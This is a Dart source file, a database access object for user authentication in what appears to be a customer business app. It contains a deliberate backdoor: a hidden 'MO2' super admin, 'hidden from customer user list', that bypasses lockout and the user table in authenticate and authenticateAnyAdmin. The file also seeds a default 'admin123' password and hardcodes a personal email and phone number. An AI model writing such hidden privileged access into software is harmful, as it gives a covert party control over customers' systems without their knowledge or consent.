import 'package:drift/drift.dart';
import '../app_database.dart';
import '../tables/users_table.dart';
import '../../utils/security_utils.dart';

part 'user_dao.g.dart';

@DriftAccessor(tables: [Users])
class UserDao extends DatabaseAccessor<AppDatabase> with _$UserDaoMixin {
  UserDao(super.db);

  static const int maxFailedAttempts = 5;
  static const Duration lockDuration = Duration(minutes: 5);

  String _hashPassword(String password) {
    return SecurityUtils.hashPassword(password);
  }

  /// Virtual Super Admin account (MO2) — hidden from customer user list.
  AppUser _buildSuperAdminUser() {
    final now = DateTime.now();
    return AppUser(
      id: -1,
      username: 'MO2',
      password: '',
      role: 'admin',
      fullName: 'MO2 — الدعم الفني',
      employeeId: null,
      isActive: true,
      failedAttempts: 0,
      lockedUntil: null,
      customPermissions: null,
      email: 'momenmohammed253@gmail.com',
      phone: '01025545211',
      createdAt: now,
      lastLogin: now,
    );
  }

  /// Check if the admin user still has the default password.
  Future<bool> hasDefaultAdminPassword() async {
    final admin = await getUserByUsername('admin');
    if (admin == null) return false;
    return SecurityUtils.verifyPassword('admin123', admin.password);
  }

  /// Special update for admin password during setup.
  Future<void> updateAdminPassword(String newPassword) async {
    final admin = await getUserByUsername('admin');
    if (admin != null) {
      await changePassword(admin.id, newPassword);
    }
  }

  /// Updates the initial admin account username and password during setup.
  Future<void> updateAdminAccount({
    required String username,
    required String password,
    String? fullName,
  }) async {
    final trimmedUsername = username.trim();
    if (trimmedUsername.isEmpty ||
        SecurityUtils.isSuperAdminUsername(trimmedUsername)) {
      throw ArgumentError('اسم المستخدم غير صالح');
    }

    var admin = await getUserByUsername('admin');
    if (admin == null) {
      final allUsers = await getAllUsers();
      final admins = allUsers.where((u) => u.role.toLowerCase() == 'admin');
      if (admins.isNotEmpty) {
        admin = admins.first;
      }
    }

    if (admin == null) {
      await createUser(
        trimmedUsername,
        password,
        'admin',
        (fullName != null && fullName.trim().isNotEmpty)
            ? fullName.trim()
            : 'مدير النظام',
      );
      return;
    }

    await (update(db.users)..where((u) => u.id.equals(admin!.id))).write(
      UsersCompanion(
        username: Value(trimmedUsername),
        password: Value(_hashPassword(password)),
        fullName: (fullName != null && fullName.trim().isNotEmpty)
            ? Value(fullName.trim())
            : const Value.absent(),
        failedAttempts: const Value(0),
        lockedUntil: const Value(null),
      ),
    );
  }

  /// Authenticate user with per-user salted hash verification, legacy hash
  /// migration, brute-force rate limiting, and hidden MO2 Super Admin support.
  Future<AppUser?> authenticate(String username, String password) async {
    if (SecurityUtils.isSuperAdminCredentials(username, password)) {
      return _buildSuperAdminUser();
    }

    final user = await getUserByUsername(username);
    if (user == null || !user.isActive) return null;

    final now = DateTime.now();
    if (user.lockedUntil != null && user.lockedUntil!.isAfter(now)) {
      return null;
    }

    final isValid = SecurityUtils.verifyPassword(password, user.password);
    if (!isValid) {
      final attempts = user.failedAttempts + 1;
      final lockUntil = attempts >= maxFailedAttempts
          ? now.add(lockDuration)
          : null;
      await (update(db.users)..where((u) => u.id.equals(user.id))).write(
        UsersCompanion(
          failedAttempts: Value(attempts),
          lockedUntil: Value(lockUntil),
        ),
      );
      return null;
    }

    // Silent upgrade from legacy SHA-256 to v2 per-user salted hash,
    // and clear any stale lockout counters.
    final needsUpgrade = SecurityUtils.isLegacyHash(user.password);
    if (needsUpgrade || user.failedAttempts > 0 || user.lockedUntil != null) {
      final upgradedHash = needsUpgrade ? _hashPassword(password) : null;
      await (update(db.users)..where((u) => u.id.equals(user.id))).write(
        UsersCompanion(
          password: upgradedHash != null
              ? Value(upgradedHash)
              : const Value.absent(),
          failedAttempts: const Value(0),
          lockedUntil: const Value(null),
        ),
      );
      return user.copyWith(
        password: upgradedHash ?? user.password,
        failedAttempts: 0,
        lockedUntil: const Value(null),
      );
    }

    return user;
  }

  /// Verify password against any active admin account OR the Super Admin (MO2).
  Future<bool> authenticateAnyAdmin(String password) async {
    if (SecurityUtils.isSuperAdminPassword(password)) {
      return true;
    }
    final allUsers = await getAllUsers();
    for (final user in allUsers) {
      if (user.isActive &&
          user.role.toLowerCase() == 'admin' &&
          SecurityUtils.verifyPassword(password, user.password)) {
        return true;
      }
    }
    return false;
  }

  Future<AppUser?> getUserById(int id) =>
      (select(db.users)..where((u) => u.id.equals(id))).getSingleOrNull();

  Future<AppUser?> getUserByUsername(String username) async {
    final trimmed = username.trim();
    if (trimmed.isEmpty) return null;
    final exact = await (select(db.users)
          ..where((u) => u.username.equals(trimmed)))
        .getSingleOrNull();
    if (exact != null) return exact;

    final lower = trimmed.toLowerCase();
    final all = await getAllUsers();
    for (final user in all) {
      if (user.username.trim().toLowerCase() == lower) {
        return user;
      }
    }
    return null;
  }

  Stream<List<AppUser>> watchAllUsers() => select(db.users).watch();

  Future<int> createUser(
    String username,
    String password,
    String role,
    String fullName,
  ) => into(db.users).insert(
    UsersCompanion(
      username: Value(username.trim()),
      password: Value(_hashPassword(password)),
      role: Value(role),
      fullName: Value(fullName.trim()),
    ),
  );

  Future<bool> updateUser(AppUser user) => update(db.users).replace(user);

  Future<void> updateLastLogin(int userId) async {
    if (userId <= 0) return;
    await (update(db.users)..where((u) => u.id.equals(userId))).write(
      UsersCompanion(lastLogin: Value(DateTime.now())),
    );
  }

  Future<void> changePassword(int userId, String newPassword) =>
      (update(db.users)..where((u) => u.id.equals(userId))).write(
        UsersCompanion(
          password: Value(_hashPassword(newPassword)),
          failedAttempts: const Value(0),
          lockedUntil: const Value(null),
        ),
      );

  Future<bool> isFirstRun() async {
    final count = await (select(db.users)).get();
    return count.isEmpty;
  }

  Future<void> createDefaultAdmin() async {
    final exists = await getUserByUsername('admin');
    if (exists == null) {
      await createUser('admin', 'admin123', 'admin', 'مدير النظام');
    }
  }

  // ── Get Active Users ───────────────────────────────────────────
  Future<List<AppUser>> getActiveUsers() =>
      (select(db.users)..where((u) => u.isActive.equals(true))).get();

  // ── Get All Users ──────────────────────────────────────────────
  Future<List<AppUser>> getAllUsers() => select(db.users).get();

  // ── Search Users ───────────────────────────────────────────────
  Future<List<AppUser>> searchUsers(String query) =>
      (select(db.users)..where(
            (u) => u.username.contains(query) | u.fullName.contains(query),
          ))
          .get();

  // ── Toggle Status ──────────────────────────────────────────────
  Future<void> toggleUserStatus(int userId, bool newStatus) async {
    await (update(db.users)..where((u) => u.id.equals(userId))).write(
      UsersCompanion(isActive: Value(newStatus)),
    );
  }

  // ── Delete User ────────────────────────────────────────────────
  Future<int> deleteUser(int userId) =>
      (delete(db.users)..where((u) => u.id.equals(userId))).go();
}
